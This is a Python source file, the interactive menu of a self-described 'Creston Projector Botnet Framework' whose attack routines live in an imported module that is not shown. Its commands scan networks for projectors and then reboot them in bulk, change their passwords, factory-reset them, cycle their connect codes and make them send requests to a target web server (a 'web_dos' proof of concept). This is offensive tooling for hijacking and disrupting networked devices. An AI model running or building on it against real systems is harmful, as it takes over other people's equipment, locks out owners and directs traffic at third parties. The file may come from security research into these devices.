#------------------------------------------------------------------------------------
#
#	GUI
#
#	Contains User Interface
#
#
#
#
#-----------------------------------------------------------------------------------

import requests
import ipaddress
import hashlib
import time
import random
import urllib3
from art import *
import creston



urllib3.disable_warnings()

#Command to print ascii art cause all cool hacker tools have ascii art!
def printAsciiTitle():
        asciiArt = text2art("CMBF",font="graffiti")
        print(asciiArt)

printAsciiTitle()

#Print the welcome message cause we are cordial and polite
print(" Welcome to the Creston Projector Botnet Framework")
print(" To start type a command, or type \'help\' to see available options")
print(" To learn more about a command type \'help [command]\'")

#Array to Hold Hosts
live_hosts = []
#Array To Hold Models
model_dict = []

while True:
	#Get User Input
	command_input = input(" > ")
	command_input = command_input.split(" ")
	#Print out the basic help menu
	if command_input[0] == 'help' and len(command_input) == 1:
		print(" Commands")
		print(" network_scan.... This will scan the network for projectors")
		print(" add_host........ This will allow you to manually enter IPs to the live hosts")
		print(" print_hosts..... This will allow you to see all live hosts")
		print(" model_scan...... This will take any live hosts and identify the model type")
		print(" print_model..... This will display all live hosts")
		print(" reboot.......... This will take begin rebooting the devices")
		print(" pass_change..... This will change the current password")
		print(" restore......... This will restore the device to factory settings")
		print(" web_dos......... This will begin sending web requests to the target device")
		print(" code_cycle...... This will being causing the connect code to change\n")
	
	#Printn out help messages for each individual fucntion
	if (command_input[0] == 'help' and len(command_input) == 2):
		if command_input[1] == 'network_scan':
			print(" This funciton will scan the network for devices with http open")
			print(" To run, type \'network_scan\' followed by a network range in CIDR notation")
			print(" Example: network_scan 10.10.10.0/24\n")
		elif command_input[1] == 'add_host':
			print(" This fuction will add a new host to the live hosts")
			print(" To run, type \'add_host\' followed by an ip")
			print(" Example: add_host 10.10.10.10\n")
		elif command_input[1] == 'print_hosts':
			print(" This funciton will display all live hosts")
			print(" To run, type \'print_hosts\'")
			print(" Example: print_hosts\n")
		elif command_input[1] == 'model_scan':
			print(" This function will scan all live hosts to identify the model")
			print(" To run, type \'model_scan\'")
			print(" Example: model_scan\n")
		elif command_input[1] == 'print_model':
			print(" This funciton will display the IP and model of all live hosts")
			print(" To run, type \'print_model\'")
			print(" Example: print_model\n")
		elif command_input[1] == 'reboot':
			print(" This function will reboot all live hosts")
			print(" To run, type \'reboot\' followed by the username and password")
			print(" Example: reboot username password\n")
		elif command_input[1] == 'pass_change':
			print(" This function will change the password of live hosts")
			print(" To run, type \'pass_change\' followed by the host, a username, the password, and the new password")
			print(" Example: pass_change 10.10.10.10 username oldpass newpass\n")
		elif command_input[1] == 'restore':
			print(" This function will restore the device to factor default")
			print(" To run, type \'restore\' followed by the targer ip")
			print(" Example: restore 10.10.10.10\n")
		elif command_input[1] == 'web_dos':
			print(" This funciton will begin sending arbitrary web requests to the target machine")
			print(" To run, type \'web_dos\' followed by the systems ip, username, password, and the target web server")
			print(" Example: web_dos 10.10.10.10 username password http://wbteach.com\n")
		elif command_input[1] == 'code_cycle':
			print(" This function will begin changing the connect code as quickly as the system will allow")
			print(" To run, type \'code_cycle\' followed by an IP, the username, and the password")
			print(" Example: code_cycle 10.10.10.10 username password\n")
	
	#Clear the Screen if its feeling too cluttered
	elif command_input[0] == 'clear':
		print(' >\n' * 100)

	#Get the user input for the network scan
	elif command_input[0] == 'network_scan':
		#Grab the ip range for the scan
		if len(command_input) < 2:
			print("Please specify an IP range")
		else:
			ip_range = command_input[1]
			#Scan network and return the live hosts
			live_hosts = creston.network_scan(ip_range)
	
	#Get the user input to manually add a host
	elif command_input[0] == 'add_host':
		#Grab the host IP to add
		if len(command_input) < 2:
			print("Please specify a host")
		else:
			live = command_input[1]
			#Add the specified IP
			live_hosts.append(live)
		
	#Print out all live hosts
	elif command_input[0] == 'print_hosts':
		print("Live Hosts")
		#Loop through all live hosts
		for host in live_hosts:
			print(host)
	
	#Run the model scan on all live hosts
	elif command_input[0] == 'model_scan':
		model_dict = creston.model_type(live_hosts)

	#Print the models
	elif command_input[0] == 'print_model':
		print("Models")
		for host in model_dict:
			print(host + " : " + model_dict[host])

	#Grab the user input for a reboot
	elif command_input[0] == 'reboot':
		#Grab username and password for input
		if len(command_input) < 3:
			print("Please enter a username and password")
		else:
			username = command_input[1]
			password = command_input[2]
			#loop through hosts and start rebooting
			for hosts in model_dict:
				creston.reboot(hosts,model_dict[hosts],username,password)

	#Grab the user input for a pass change
	elif command_input[0] == 'pass_change':
		if len(command_input) < 5:
			print("Please enter the host, username, password, and new password")
		else:
			#Grab username, current password, and new password
			host = command_input[1]
			username = command_input[2]
			password = command_input[3]
			newpass = command_input[4]
			#Run through change passwordds based on the model
			#for host in model_dict:
			if model_dict[host] == 'OG':
				creston.change_pass(host,username,password,newpass)
			else:
				pass
	#Grab the input and perform a factory restore
	elif command_input[0] == 'restore':
		#Loop through the host and perform a factory restore
		for hosts in model_dict:
			creston.restore(hosts,model_dict[hosts])
			
	#Begin sending web requests form the projects
	#This is a proof of concept and does not contianully send requets
	elif command_input[0] == 'web_dos':
		if len(command_input) < 5:
			print("Please enter a host, username, password, and url")
		else:
			#Grab host, username, password, and webserver
			host = command_input[1]
			username = command_input[2]
			password = command_input[3]
			webserver = command_input[4]
			creston.web_dos(host,username,password,webserver)
	elif command_input[0] == 'code_cycle':
		if len(command_input) < 4:
			print("Please enter a host, username, password")
		else:
			host = command_input[1]
			username = command_input[2]
			password = command_input[3]
			creston.code_cycle(host,username,password)
	#Quit the program
	elif command_input[0] == 'exit':
		exit()
